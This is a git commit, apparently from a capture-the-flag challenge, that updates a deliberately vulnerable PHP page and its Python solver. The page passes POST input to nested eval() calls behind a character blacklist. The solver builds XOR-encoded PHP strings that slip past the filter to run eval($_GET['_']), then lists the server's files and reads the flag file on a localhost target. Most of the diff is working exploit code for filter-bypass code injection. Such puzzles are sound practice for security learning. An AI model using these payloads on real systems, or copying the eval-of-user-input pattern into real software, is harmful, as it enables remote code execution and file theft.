299a78dafb58180f8a93342cd16c034d8806e10c
ganes <gustiganes@gmail.com>
2021-09-26 00:40:06 +0800

    update solver

--- index.php
+++ index.php
@@ -1,16 +1,16 @@
 <?php
   if($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['e'])){
-    $input_user = $_POST['e'];  
-    if(preg_match_all('/[^\x20-\x7e]/',$input_user)){
+    $input_user = $_POST['e'];     
+    if(preg_match('/[^\x20-\x7e]/',$input_user)){
       die("Not Printable!");
     }
-    if(preg_match_all('/[0-9|a-z|A-Z|"|@|!|\x20|\]]/',$input_user)){      
+    if(preg_match('/[0-9|a-z|\x7c|A-Z|\x22|\x40|\x21|\x20|\5b|\x5d]/',$input_user)){      
       die("bad char!");
     }
-    if(strlen(count_chars($input_user,3)) > 20){
+    if(strlen(count_chars($input_user,3)) > 0x12){
       die("char too long!");
     };
-    if(strlen($input_user) > 140){      
+    if(strlen($input_user) > 0x87){      
       die("string too long!");
     }
     eval('echo '. eval('return ' . $input_user . ';') . ';');
--- solver.py
+++ solver.py
@@ -1,48 +1,58 @@
 import string,requests
+def blacklist_payload(strings=""):
+    blacklist = {'!':"('}'^'\\')","@":"('}'^'=')","[":"('`'^';')","]":"('`'^'=')","|":"('_'^'#')"} 
+    for i in strings:
+        if i in blacklist.keys():
+            strings = strings.replace(i,blacklist[i]).replace(")'",")").replace("'(","(")
+            
+    return strings
 
-def create_payload(strings=b""):
-    all_key = b"&|\[]\"#$%\'()*+,-./:;<=>?^_{}`"
-    # all_key = b"!\"#$%&\'()*+,-./:;<=>?@[\]^_{|}`"
+def create_payload(strings=b"",mode=0):
+    all_key = b"&|\\\"#$%'()*+,-./:;<=>?^_{}`"    
+    if mode == 1:
+        all_key = b"@\"|[]!#$%&\'()*+,-./:;<=>?\^_{}`"
     gets = ""
     keys = ""
     result = {}
 
     for i in strings:
+        if i == ord("'"):            
+            result[chr(i)] ="'\''"
+            continue
+        if i in [ord(q) for q in "&|\\\"#$%()*+,-./:;<=>?^_{}`"]:
+            result[chr(i)] = "'" + chr(i) + "'"
+            continue
         for j in all_key: 
             for z in all_key:
                 if z^j == i:                
                     gets += chr(j)  
-                    keys += chr(z)
+                    keys += chr(z)                    
                     result[chr(i)] = ".".join(["('"+ gets[i] + "'" + f"^'{keys[i]}')" for i in range(len(gets))])          
                     gets = ""
                     keys = ""
                     break
-
+    
     payloads = []
-    blacklist = {'!':"('}'^'\\')","@":"('}'^'=')"}
-    for i in strings:            
+    for i in strings:       
         try:
             payloads.append(result[chr(i)])
     
-        except KeyError as e: 
-            payloads.append(str(e))
-        
-    return ".".join(payloads).replace("\\","\\\\")
+        except KeyError as e:      
+            if str(e).replace("'","") in [')','(',';','+','/','*',',','-','.',':',"'"]:
+                payloads.append(str(e))
+                continue            
+            get_blacklist_payload = create_payload(str(e).replace("'","").encode(),1)
+            payloads.append(blacklist_payload(get_blacklist_payload))
 
+    return ".".join(payloads).replace("'''","'\\''").replace("('{'^'\\')","'\\''")
+
+payload_post = create_payload(b"eval($_GET['_'])")
 def read_flag(url):
     payload_get = "?_= echo gzread(gzopen('z1n1_flagnya_om_slashr00t_5.txt','r'),1024);"
-    payload_post = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
     return requests.post(url+payload_get,data={"e":payload_post}).text
 def get_dir_list(url):
-    payload_get = "?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"
-    payload_post = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
+    payload_get = "?_=$a=new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$a->rewind();print_r(iterator_to_array($a));"    
     return requests.post(url+payload_get,data={"e":payload_post}).text
-
-# list dir
-# url = "http://localhost:6074/slashroot/cmd.php?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"
-
-# read file
-# url = "http://localhost:6074/slashroot/soal_fix/index.php?_= echo gzread(gzopen('z1n1_flagnya_om_slashr00t_5.txt','r'),1024);"
 
 print(get_dir_list("http://localhost:6074/slashroot/soal_fix/index.php"))
 print(read_flag("http://localhost:6074/slashroot/soal_fix/index.php"))
